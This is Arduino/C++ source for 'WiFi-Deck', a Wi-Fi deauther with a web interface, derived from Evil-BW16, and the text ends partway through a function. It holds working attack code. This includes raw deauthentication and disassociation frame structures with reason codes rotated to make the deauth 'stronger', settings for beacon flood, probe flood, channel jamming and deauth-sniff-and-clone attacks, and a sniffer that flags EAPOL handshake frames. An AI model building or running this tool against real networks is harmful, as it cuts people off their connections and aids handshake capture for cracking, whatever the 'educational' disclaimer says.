/*
   WiFi-Deck - WiFi Dual band deauther with Web Interface

   Based on Evil-BW16 v1.0.2 by 7h30th3r0n3
   Modified to add WiFi Web Server + JSON API + Mobile-friendly HTML UI

   Copyright (c) 2024 7h30th3r0n3 (original)
   WebUI modification: 2026

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited.
   Users must comply with all applicable laws and regulations.
*/

#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "platform_stdlib.h"
#include "osdep_service.h"
#include "FreeRTOS.h"
#include "semphr.h"
#include "BLEDevice.h"
#include <FlashMemory.h>
#include <strings.h>
#include <stddef.h>
#include <errno.h>
#include <ctype.h>

extern "C" {
#include "gap_le.h"
#include "gap_adv.h"
#include "gap_config.h"
#include "gap_conn_le.h"
#include "gatt_builtin_services.h"
}

#ifdef max
#undef max
#endif
#ifdef min
#undef min
#endif

#include <vector>

//==========================
// User Configuration
//==========================
#define DEFAULT_WIFI_SSID "WiFi-Deck"
#define DEFAULT_WIFI_PASS "12345678"
#define DEFAULT_BLE_NAME  "WiFi-Deck"
#define WIFI_CHANNEL      1

char ap_ssid[33]  = DEFAULT_WIFI_SSID;
char ap_pass[65]  = DEFAULT_WIFI_PASS;
char ble_name[27] = DEFAULT_BLE_NAME;

bool USE_LED = true;
bool apEnabled = true;        // SoftAP/WebUI 是否开启（ap off 后进入 BLE-only 隐身省电模式）
volatile bool softApActive = false; // SoftAP 实际是否在空中运行（与 apEnabled 区分，避免嗅探期误判）
bool pendingApRestart = false; // 延迟重启 SoftAP 标志（确保 BLE/HTTP 响应先发回再重开热点）
unsigned long pendingApRestartAt = 0; // 请求重启时间戳，留足 BLE notify / HTTP 200 发出窗口

// Attack parameters
unsigned long last_cycle     = 0;
unsigned long cycle_delay    = 2000;     // Delay between attack cycles (ms)
unsigned long scan_time      = 5000;     // WiFi scan duration (ms)
unsigned long num_send_frames = 3;
int start_channel            = 1;        // 1 => 2.4GHz start, 36 => 5GHz only
bool scan_between_cycles     = false;    // If true, scans between each attack cycle

uint8_t dst_mac[6]  = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast

enum SniffMode {
  SNIFF_ALL,
  SNIFF_BEACON,
  SNIFF_PROBE,
  SNIFF_DEAUTH,
  SNIFF_EAPOL,
  SNIFF_PWNAGOTCHI,
  SNIFF_STOP
};

// Channel hopping configuration
volatile bool isHopping = false;
unsigned long lastHopTime = 0;
const unsigned long HOP_INTERVAL = 500; // 500ms between hops
const int CHANNELS_2GHZ[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
const int CHANNELS_5GHZ[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
int currentChannelIndex = 0;
bool hopUse5GHz = false;
bool hopResetPending = true;
volatile int currentChannel = WIFI_CHANNEL; // Default channel

volatile SniffMode currentMode = SNIFF_STOP;  // Start in STOP mode
volatile bool isSniffing = false;             // Global flag to track if sniffing is active

const int MAX_CUSTOM_CHANNELS = 50;
int customChannels[MAX_CUSTOM_CHANNELS];
int numCustomChannels = 0;
bool useCustomChannels = false;

//-------------------
// Timed Attack & Timed Sniff (WebUI safe auto-recovery)
//-------------------
bool timedAttackEnabled      = false;
unsigned long attackStartTime = 0;
unsigned long attackDuration  = 10000; // default 10 seconds

bool timedSniffEnabled       = false;
unsigned long sniffStartTime  = 0;
unsigned long sniffDuration   = 15000; // default 15 seconds for WebUI safe sniff

//-------------------
// Flood / Jam / Sniff-clone attacks (merged from upstream v1.0.3)
//-------------------
#define BEACON_MAX_SSID_LEN 20

bool beacon_flood_enabled    = false;
unsigned long beacon_flood_delay = 50;   // ms between beacons
unsigned long last_beacon_flood  = 0;
uint16_t beacon_flood_count  = 0;

bool probe_flood_enabled     = false;
unsigned long probe_flood_delay = 30;   // ms between probes
unsigned long last_probe_flood  = 0;
uint16_t probe_flood_count   = 0;

bool signal_jam_enabled     = false;
unsigned long signal_jam_hop_delay = 100; // ms per channel
unsigned long last_signal_jam  = 0;
int signal_jam_ch_index     = 0;
uint16_t signal_jam_count   = 0;

volatile bool deauth_sniff_enabled = false;
bool deauth_sniff_prev_hop  = false;
uint8_t sniffed_deauth_src[6] = {0};
volatile int sniffed_deauth_ch = WIFI_CHANNEL;
volatile bool has_sniffed_deauth = false;
unsigned long last_deauth_sniff_attack = 0;
unsigned long deauth_sniff_interval = 500;
volatile unsigned long lastCtrlLogMs = 0;
volatile unsigned long lastDataLogMs = 0;
volatile bool emergencyStopRequested = false;
volatile bool priorityStopPending = false;
volatile bool bleCmdQueueOverflow = false;
volatile bool bleCmdOversizeDrop = false;

int single_ap_index = 0;

//==========================================================
// Frame Structures
//==========================================================
// Rotating sequence number counter (must be nonzero; real APs increment)
static uint16_t seq_num_counter = 1;

// Reason code rotation sets for stronger deauth/disassoc
const uint16_t deauth_reasons[] = {1, 2, 4, 6, 7};
const uint16_t disassoc_reasons[] = {1, 2, 3, 8};
const uint8_t num_deauth_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);
const uint8_t num_disassoc_reasons = sizeof(disassoc_reasons) / sizeof(disassoc_reasons[0]);

#pragma pack(push, 1)
typedef struct {
  uint16_t frame_control = 0x00C0;  // Deauth (little-endian on wire)
  uint16_t duration = 0x003A;        // Standard duration for management frames
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0006;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0x00A0;  // Disassociation
  uint16_t duration = 0x003A;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0008;
} DisassocFrame;
#pragma pack(pop)

//==========================================================
// Data Structures
//==========================================================
struct WiFiScanResult {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

struct WiFiStationResult {
  bool selected = false;
  String mac_str;
  uint8_t mac[6];
  short rssi;
};

// Generate a random, locally-administered MAC for flood frames
void randomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  mac[0] = (mac[0] & 0xFE) | 0x02;  // locally administered bit
}

// Forward declarations for functions used before definition
// (Arduino IDE auto-generates these, but explicit is better)
void extractSsidCstr(const uint8_t *frame, int totalLen, int possibleOffset, char *out, size_t outSize);
bool isPwnagotchiMac(const uint8_t *mac);
bool isEAPOL(const uint8_t *buf, int len);
bool setChannel(int newChannel);
void resetHopState();
void startSoftAP();
void restoreBleCoex();
bool enterStaMode(const char *context);
void restoreRadioAfterSniff();
void scheduleApRestart();
void stopAllActiveAttacks();
void stopConflictingModesBeforeAttack();
void clearDeauthSniffState();
void prepareRadioForSniff(bool turnOffAp);
void startMonitorSniff(SniffMode mode, bool timed = false, unsigned long dur = 0);
void pushSniffLog(const char *msg);
void bleSendLine(const String &line);
void bleSendLog(const String &msg);
void blePushStatus();
void blePushInfo();
void blePushScanResults(bool emitBegin = true, bool isSync = false);
void pollSerialInput();
bool isStopCmdCstr(const char *s);
bool hasQueuedStopInCmdRing();
bool consumePriorityStopIfPending();
bool startsWithIgnoreCase(const String &s, const char *prefix);
void restoreDefaultChannelIfNeeded(bool force = false);
void wifi_tx_beacon_frame(const char* ssid, int ssid_len, uint8_t channel);
void wifi_tx_probe_req_frame(const char* ssid, int ssid_len);

static inline int getCurrentChannelSafe() {
  rtw_enter_critical(NULL, NULL);
  int ch = currentChannel;
  rtw_exit_critical(NULL, NULL);
  return ch;
}

static inline void setCurrentChannelSafe(int ch) {
  rtw_enter_critical(NULL, NULL);
  currentChannel = ch;
  rtw_exit_critical(NULL, NULL);
}

static inline void formatMac(const uint8_t *mac, char *out, size_t outSize) {
  snprintf(out, outSize, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// =========================
// 802.11 Header Structure
// =========================
#pragma pack(push, 1)
struct wifi_ieee80211_mac_hdr {
  uint16_t frame_control;
  uint16_t duration_id;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
};
#pragma pack(pop)

static inline uint8_t ieee80211_get_type(uint16_t fc) {
  return (fc & 0x0C) >> 2;
}
static inline uint8_t ieee80211_get_subtype(uint16_t fc) {
  return (fc & 0xF0) >> 4;
}
static inline bool is_broadcast_mac(const uint8_t *mac) {
  return mac[0]==0xFF && mac[1]==0xFF && mac[2]==0xFF && mac[3]==0xFF && mac[4]==0xFF && mac[5]==0xFF;
}

// =========================
// Promiscuous Callback
// =========================
void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/) {
  SniffMode modeSnapshot;
  bool sniffingSnapshot;
  bool deauthSniffSnapshot;
  int channelSnapshot;
  rtw_enter_critical(NULL, NULL);
  modeSnapshot = currentMode;
  sniffingSnapshot = isSniffing;
  deauthSniffSnapshot = deauth_sniff_enabled;
  channelSnapshot = currentChannel;
  rtw_exit_critical(NULL, NULL);

  if (!sniffingSnapshot || modeSnapshot == SNIFF_STOP) return;

  if (!buf || len < sizeof(wifi_ieee80211_mac_hdr)) {
    return;
  }

  wifi_ieee80211_mac_hdr *hdr = (wifi_ieee80211_mac_hdr *)buf;
  uint16_t fc = hdr->frame_control;
  uint8_t ftype = ieee80211_get_type(fc);
  uint8_t fsubtype = ieee80211_get_subtype(fc);

  switch (modeSnapshot) {
    case SNIFF_ALL:
      break;
    case SNIFF_BEACON:
      if (!(ftype == 0 && fsubtype == 8)) return;
      break;
    case SNIFF_PROBE:
      if (!(ftype == 0 && (fsubtype == 4 || fsubtype == 5))) return;
      break;
    case SNIFF_DEAUTH:
      if (!(ftype == 0 && (fsubtype == 12 || fsubtype == 10))) return;
      break;
    case SNIFF_EAPOL:
      if (ftype != 2 || !isEAPOL(buf, len)) return;
      break;
    case SNIFF_PWNAGOTCHI:
      if (!(ftype == 0 && fsubtype == 8 && isPwnagotchiMac(hdr->addr2))) return;
      break;
    case SNIFF_STOP:
    default:
      return;
  }

  char logBuf[192];
  const uint8_t *framePtr = (const uint8_t *)buf;

  if (ftype == 0) {
    char ssidBuf[65];
    char mac2[18], mac1[18];
    if (fsubtype == 8) {
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      extractSsidCstr(framePtr, len, 36, ssidBuf, sizeof(ssidBuf));
      if (ssidBuf[0] != '\0') {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s SSID: %s%s",
                 mac2, ssidBuf,
                 isPwnagotchiMac(hdr->addr2) ? " Pwnagotchi Beacon!" : "");
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s", mac2);
      }
    }
    else if (fsubtype == 12) {
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      formatMac(hdr->addr1, mac1, sizeof(mac1));
      if (len >= 26) {
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Deauth detected Sender MAC: %s Receiver MAC: %s Reason code: %u",
                 mac2, mac1, (unsigned)reasonCode);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Deauth detected Sender MAC: %s Receiver MAC: %s", mac2, mac1);
      }
      // Capture deauth source MAC and channel for deauth-sniff-and-clone mode
      if (deauthSniffSnapshot && !is_broadcast_mac(hdr->addr1)) {
        rtw_enter_critical(NULL, NULL);
        memcpy(sniffed_deauth_src, hdr->addr2, 6);
        sniffed_deauth_ch = channelSnapshot;
        has_sniffed_deauth = true;
        rtw_exit_critical(NULL, NULL);
      }
    }
    else if (fsubtype == 4) {
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      extractSsidCstr(framePtr, len, 24, ssidBuf, sizeof(ssidBuf));
      if (ssidBuf[0] != '\0') {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s Probe SSID: %s", mac2, ssidBuf);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s", mac2);
      }
    }
    else if (fsubtype == 5) {
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      extractSsidCstr(framePtr, len, 36, ssidBuf, sizeof(ssidBuf));
      if (ssidBuf[0] != '\0') {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s SSID: %s", mac2, ssidBuf);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s", mac2);
      }
    }
    else if (fsubtype == 10) {
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      formatMac(hdr->addr1, mac1, sizeof(mac1));
      if (len >= 26) {
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Disassoc detected Sender MAC: %s Receiver MAC: %s Reason code: %u",
                 mac2, mac1, (unsigned)reasonCode);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Disassoc detected Sender MAC: %s Receiver MAC: %s", mac2, mac1);
      }
    }
    else {
      snprintf(logBuf, sizeof(logBuf), "[MGMT] Other subtype = %u", fsubtype);
    }
  }
  else if (ftype == 1) {
    // SNIFF_ALL 下对高频 ACK/RTS 等控制帧做 300ms 独立限频，限流通过后再构造日志
    unsigned long now = millis();
    rtw_enter_critical(NULL, NULL);
    if (now - lastCtrlLogMs < 300) {
      rtw_exit_critical(NULL, NULL);
      return;
    }
    lastCtrlLogMs = now;
    rtw_exit_critical(NULL, NULL);
    snprintf(logBuf, sizeof(logBuf), "[CTRL] Subtype = %u", fsubtype);
  }
  else if (ftype == 2) {
    if (isEAPOL(buf, len)) {
      char mac2[18], mac1[18];
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      formatMac(hdr->addr1, mac1, sizeof(mac1));
      snprintf(logBuf, sizeof(logBuf), "[DATA] EAPOL detected! Source MAC: %s Destination MAC: %s", mac2, mac1);
    } else {
      unsigned long now = millis();
      rtw_enter_critical(NULL, NULL);
      if (now - lastDataLogMs < 300) {
        rtw_exit_critical(NULL, NULL);
        return;
      }
      lastDataLogMs = now;
      rtw_exit_critical(NULL, NULL);
      snprintf(logBuf, sizeof(logBuf), "[DATA] Other data frame.");
    }
  }
  else {
    snprintf(logBuf, sizeof(logBuf), "[EXT] Type = %u", ftype);
  }

  // 严禁在 Wi-Fi RX 回调中同步 Serial.println 阻塞串口；统一入环后由主循环消费并输出
  pushSniffLog(logBuf);
}

// =========================
// Utility Functions
// =========================
bool setChannel(int newChannel) {
  bool sniffingNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffingNow = isSniffing;
  rtw_exit_critical(NULL, NULL);

  // SoftAP 实际在空中工作且未处于嗅探态时，切离热点信道会破坏 WebUI 连接
  if (softApActive && !sniffingNow && newChannel != WIFI_CHANNEL) {
    Serial.println("[WARN] SoftAP active on CH 1; skipping channel lock.");
    return false;
  }
  if (wifi_set_channel(newChannel) == RTW_SUCCESS) {
    setCurrentChannelSafe(newChannel);
    return true;
  }
  Serial.print("[WARN] wifi_set_channel(");
  Serial.print(newChannel);
  Serial.println(") failed");
  return false;
}

void resetHopState() {
  hopUse5GHz = false;
  currentChannelIndex = 0;
  hopResetPending = true;
  lastHopTime = millis();
}

void hopChannel() {
  if (!isHopping) return;
  unsigned long now = millis();
  if (!hopResetPending && (now - lastHopTime < HOP_INTERVAL)) return;

  int nextChannel = WIFI_CHANNEL;
  if (useCustomChannels) {
    if (numCustomChannels <= 0) {
      useCustomChannels = false;
    } else {
      if (currentChannelIndex < 0 || currentChannelIndex >= numCustomChannels) {
        currentChannelIndex = 0;
      }
      nextChannel = customChannels[currentChannelIndex];
      currentChannelIndex = (currentChannelIndex + 1) % numCustomChannels;
    }
  }
  if (!useCustomChannels) {
    const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
    const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);

    if (!hopUse5GHz) {
      if (currentChannelIndex < 0 || currentChannelIndex >= num2G) {
        currentChannelIndex = 0;
      }
      nextChannel = CHANNELS_2GHZ[currentChannelIndex];
      currentChannelIndex++;
      if (currentChannelIndex >= num2G) {
        currentChannelIndex = 0;
        hopUse5GHz = true;
      }
    } else {
      if (currentChannelIndex < 0 || currentChannelIndex >= num5G) {
        currentChannelIndex = 0;
      }
      nextChannel = CHANNELS_5GHZ[currentChannelIndex];
      currentChannelIndex++;
      if (currentChannelIndex >= num5G) {
        currentChannelIndex = 0;
        hopUse5GHz = false;
      }
    }
  }

  hopResetPending = false;
  lastHopTime = now;
  if (setChannel(nextChannel)) {
    Serial.print("[HOP] Switched to channel ");
    Serial.println(nextChannel);
  }
}

void startSniffing() {
  stopAllActiveAttacks();
  bool alreadySniffing = false;
  rtw_enter_critical(NULL, NULL);
  alreadySniffing = isSniffing;
  rtw_exit_critical(NULL, NULL);

  if (!alreadySniffing) {
    Serial.println("[INFO] Enabling promiscuous mode...");
    // Shut down HTTP listening socket cleanly before wifi_enter_promisc_mode() calls wifi_off()
    prepareRadioForSniff(false);
    wifi_enter_promisc_mode();
    restoreBleCoex();
    int targetCh = getCurrentChannelSafe();
    setChannel(targetCh);

    // 先设置状态标志再启用回调，避免首波回调丢失或读到 SNIFF_STOP
    rtw_enter_critical(NULL, NULL);
    if (currentMode == SNIFF_STOP) {
      currentMode = SNIFF_ALL;
    }
    isSniffing = true;
    rtw_exit_critical(NULL, NULL);

    if (wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1) != RTW_SUCCESS) {
      rtw_enter_critical(NULL, NULL);
      isSniffing = false;
      currentMode = SNIFF_STOP;
      rtw_exit_critical(NULL, NULL);
      timedSniffEnabled = false;
      Serial.println("[ERROR] Failed to enable promiscuous callback.");
      restoreRadioAfterSniff();
      return;
    }
    Serial.println("[INFO] Sniffer initialized and running.");
  }
}

// 停止混杂抓包与伴生 Deauth 嗅探状态，但不触发 AP/STA 模式切换
bool haltPromiscSniff() {
  timedSniffEnabled = false;
  bool active = false;
  rtw_enter_critical(NULL, NULL);
  active = (isSniffing || deauth_sniff_enabled);
  rtw_exit_critical(NULL, NULL);
  if (!active) return false;

  // 先关闭底层混杂回调，再清理共享状态位
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
  rtw_enter_critical(NULL, NULL);
  isSniffing = false;
  currentMode = SNIFF_STOP;
  rtw_exit_critical(NULL, NULL);
  clearDeauthSniffState();
  resetHopState();
  return true;
}

void stopSniffing() {
  if (haltPromiscSniff()) {
    Serial.println("[CMD] Sniffer stopped");
    restoreRadioAfterSniff();
  }
}

size_t validUtf8CharLen(const uint8_t *p, size_t rem) {
  if (!p || rem == 0) return 0;
  uint8_t b0 = p[0];
  if (b0 < 0x80) return 1;
  if (b0 >= 0xC2 && b0 <= 0xDF) {
    if (rem >= 2 && (p[1] & 0xC0) == 0x80) return 2;
    return 0;
  }
  if (b0 >= 0xE0 && b0 <= 0xEF) {
    if (rem >= 3 && (p[1] & 0xC0) == 0x80 && (p[2] & 0xC0) == 0x80) {
      if (b0 == 0xE0 && p[1] < 0xA0) return 0;  // overlong
      if (b0 == 0xED && p[1] > 0x9F) return 0;  // UTF-16 surrogate range
      return 3;
    }
    return 0;
  }
  if (b0 >= 0xF0 && b0 <= 0xF4) {
    if (rem >= 4 && (p[1] & 0xC0) == 0x80 && (p[2] & 0xC0) == 0x80 && (p[3] & 0xC0) == 0x80) {
      if (b0 == 0xF0 && p[1] < 0x90) return 0;  // overlong
      if (b0 == 0xF4 && p[1] > 0x8F) return 0;  // > U+10FFFF
      return 4;
    }
    return 0;
  }
  return 0;
}

void sanitizeUtf8BytesToCstr(const uint8_t *src, size_t srcLen, char *out, size_t outSize, bool stripCtrl) {
  if (!out || outSize == 0) return;
  out[0] = '\0';
  if (!src || srcLen == 0) return;

  size_t pos = 0;
  size_t i = 0;
  while (i < srcLen && pos + 1 < outSize) {
    uint8_t c = src[i];
    if (c == 0x00) {
      i++;
      continue;
    }
    if (c < 0x80) {
      if (!stripCtrl || (c >= 0x20 && c != 0x7F)) {
        out[pos++] = (char)c;
      }
      i++;
      continue;
    }
    size_t seqLen = validUtf8CharLen(&src[i], srcLen - i);
    if (seqLen > 0) {
      if (pos + seqLen >= outSize) break;
      for (size_t k = 0; k < seqLen; k++) {
        out[pos++] = (char)src[i + k];
      }
      i += seqLen;
    } else {
      out[pos++] = '?';
      i++;
    }
  }
  out[pos] = '\0';
}

void extractSsidCstr(const uint8_t *frame, int totalLen, int possibleOffset, char *out, size_t outSize) {
  if (!out || outSize == 0) return;
  out[0] = '\0';
  if (!frame || possibleOffset < 0 || totalLen < possibleOffset + 2) {
    return;
  }
  int offset = possibleOffset;
  // 遍历 IE TLV，直到找到 SSID (tag 0) 或超出边界（全程零堆内存分配，可在 RX 线程安全运行）
  while (offset + 2 <= totalLen) {
    uint8_t tagNumber = frame[offset];
    uint8_t tagLength = frame[offset + 1];
    if (offset + 2 + tagLength > totalLen) break;  // 畸形长度，停止
    if (tagNumber == 0) {
      sanitizeUtf8BytesToCstr(&frame[offset + 2], (size_t)tagLength, out, outSize, true);
      return;
    }
    offset += 2 + tagLength;
  }
}

bool isPwnagotchiMac(const uint8_t *mac) {
  const uint8_t pwnMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD};
  for (int i = 0; i < 6; i++) {
    if (mac[i] != pwnMac[i]) return false;
  }
  return true;
}

bool isEAPOL(const uint8_t *buf, int len) {
  if (!buf || len < 32) return false;
  uint8_t ftype = (buf[0] & 0x0C) >> 2;
  if (ftype != 2) return false; // 必须是 Data 帧
  // 精确计算 802.11 帧头长度，覆盖 4-Address(WDS) / QoS / QoS+HTC 变体
  int hdrLen = 24;
  if ((buf[1] & 0x03) == 0x03) hdrLen += 6; // ToDS=1 & FromDS=1 -> 4-Address，多 6 字节
  bool isQoS = ((buf[0] & 0x80) != 0);
  if (isQoS) {
    hdrLen += 2; // QoS Data (Subtype bit3)
    if ((buf[1] & 0x80) != 0) {
      hdrLen += 4; // +HTC 仅在 QoS Data 且 Order 置位时存在
    }
  }
  if (len < hdrLen + 8) return false;
  // LLC/SNAP (AA AA 03 00 00 00) + EtherType 0x888E (EAPOL)
  return (buf[hdrLen] == 0xAA && buf[hdrLen + 1] == 0xAA && buf[hdrLen + 2] == 0x03 &&
          buf[hdrLen + 3] == 0x00 && buf[hdrLen + 4] == 0x00 && buf[hdrLen + 5] == 0x00 &&
          buf[hdrLen + 6] == 0x88 && buf[hdrLen + 7] == 0x8E);
}

//==========================================================
// Externs & Prototypes (Realtek / Ameba Specific)
//==========================================================
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);
extern "C" void rtw_free_xmitbuf(void* pxmitpriv, void* pxmitbuf);
extern "C" void rtw_free_xmitframe(void* pxmitpriv, void* pxmitframe);
extern "C" int wifi_get_mac_address(char *mac);

void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x06);
void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x08);
int scanNetworks(bool emitBegin = true, bool isSync = false);
void printScanResults();
bool applyTargetSpec(const String &spec, bool allowClear, String &errMsg);
bool executeCommand(String command, String *errOut = nullptr, bool fromHttp = false);
void handleCommand(String command);
bool parseStrictLong(const String &s, long &out);
bool validateConfigSetting(const String &key, const String &rawValue, String &errMsg);
bool applyConfigSetting(const String &key, const String &rawValue, bool &apChanged);
void targetAttack();
void startTimedAttack(unsigned long durationMs);
void checkTimedAttack();
void handleWebClient();
String getScanResultsJSON();
String getStatusJSON();
String getInfoJSON();
String jsonEscapeTruncated(const String &s, size_t maxEscapedBytes, const char *ellipsis = "...");
String jsonEscape(const String &s);
extern const char INDEX_HTML[];

//==========================================================
// Global Vectors & Scan Mutex
//==========================================================
std::vector<WiFiScanResult> scan_results;
std::vector<WiFiScanResult> target_aps;
SemaphoreHandle_t scanMutex = NULL;

//==========================================================
// Disassociation Attack Control
//==========================================================
bool disassoc_enabled           = false;
unsigned long disassoc_interval = 1000;
unsigned long last_disassoc_attack = 0;
bool attack_enabled             = false;
bool scan_enabled               = false;
bool target_mode                = false;
uint32_t tx_success_count       = 0;
uint32_t tx_fail_count          = 0;

//==========================================================
// BLE (Nordic UART Service) — Android App control channel
//==========================================================
#define UART_SERVICE_UUID       "6E400001-B5A3-F393-E0A9-E50E24DCCA9E"
#define CHARACTERISTIC_UUID_RX  "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"
#define CHARACTERISTIC_UUID_TX  "6E400003-B5A3-F393-E0A9-E50E24DCCA9E"
#define BLE_BUF_SIZE            220   // < CHAR_VALUE_MAX_LEN (230)
#define LOG_STR_LEN             128
#define LOG_RING_SIZE           24

BLEService UartService(UART_SERVICE_UUID);
BLECharacteristic BleRx(CHARACTERISTIC_UUID_RX);
BLECharacteristic BleTx(CHARACTERISTIC_UUID_TX);
BLEAdvertData advdata;
BLEAdvertData scndata;
volatile bool bleNotifyEnabled = false;
volatile uint8_t activeConnId = 0;  // 当前 BLE 连接 ID（configServer(1) 下恒为 0，但语义上应记录回调传入值）
volatile bool bleStarted = false;

// Cross-thread command ring queue (BLE task -> loop)
#define CMD_RING_SIZE 16
char cmdRing[CMD_RING_SIZE][BLE_BUF_SIZE];
volatile uint8_t cmdHead = 0;
volatile uint8_t cmdTail = 0;

// Non-blocking Serial line buffer & pending command queue (main loop only)
#define SERIAL_CMD_QUEUE_SIZE 8
char serialRxBuf[BLE_BUF_SIZE];
size_t serialRxLen = 0;
bool serialRxOverflow = false;
char serialCmdQueue[SERIAL_CMD_QUEUE_SIZE][BLE_BUF_SIZE];
uint8_t serialCmdHead = 0;
uint8_t serialCmdTail = 0;

// Cross-thread sniff log ring buffer (WiFi promisc thread -> loop)
char sniffLogRing[LOG_RING_SIZE][LOG_STR_LEN];
volatile uint8_t logHead = 0;
volatile uint8_t logTail = 0;
volatile uint32_t droppedLogCount = 0;

// WebUI sniff log history buffer (persists across timed sniff sessions for /api/logs)
#define WEB_LOG_HISTORY_SIZE 32
char webLogHistory[WEB_LOG_HISTORY_SIZE][LOG_STR_LEN];
volatile uint8_t webLogHead = 0;
volatile uint8_t webLogCount = 0;

static inline bool lockScanMutex(TickType_t ticksToWait = portMAX_DELAY) {
  if (scanMutex == NULL) return true;
  return xSemaphoreTake(scanMutex, ticksToWait) == pdTRUE;
}

static inline void unlockScanMutex() {
  if (scanMutex != NULL) {
    xSemaphoreGive(scanMutex);
  }
}

std::vector<WiFiScanResult> snapshotScanResults() {
  std::vector<WiFiScanResult> copy;
  if (lockScanMutex()) {
    copy = scan_results;
    unlockScanMutex();
  }
  return copy;
}

std::vector<WiFiScanResult> snapshotTargetAps() {
  std::vector<WiFiScanResult> copy;
  if (lockScanMutex()) {
    copy = target_aps;
    unlockScanMutex();
  }
  return copy;
}

std::vector<WiFiScanResult> snapshotDisassocTargets() {
  std::vector<WiFiScanResult> copy;
  if (lockScanMutex()) {
    // 决策 A：严禁在未选择目标或 target_mode == false 时回退全量 scan_results
    if (target_mode && !target_aps.empty()) {
      copy = target_aps;
    }
    unlockScanMutex();
  }
  return copy;
}

size_t getScanCountSafe() {
  size_t count = 0;
  if (lockScanMutex()) {
    count = scan_results.size();
    unlockScanMutex();
  }
  return count;
}

size_t getTargetCountSafe() {
  size_t count = 0;
  if (lockScanMutex()) {
    count = target_aps.size();
    unlockScanMutex();
  }
  return count;
}

void getScanAndTargetCountsSafe(size_t &scanCountOut, size_t &targetCountOut, bool &targetModeOut) {
  scanCountOut = 0;
  targetCountOut = 0;
  targetModeOut = false;
  if (lockScanMutex()) {
    scanCountOut = scan_results.size();
    targetCountOut = target_aps.size();
    targetModeOut = target_mode;
    unlockScanMutex();
  }
}

bool isStopCmdCstr(const char *s) {
  if (!s) return false;
  return (strcasecmp(s, "stop") == 0 ||
          strcasecmp(s, "stop all") == 0 ||
          strcasecmp(s, "stop deauther") == 0);
}

bool hasQueuedStopInCmdRing() {
  bool found = false;
  rtw_enter_critical(NULL, NULL);
  if (priorityStopPending) {
    found = true;
  } else {
    uint8_t idx = cmdTail;
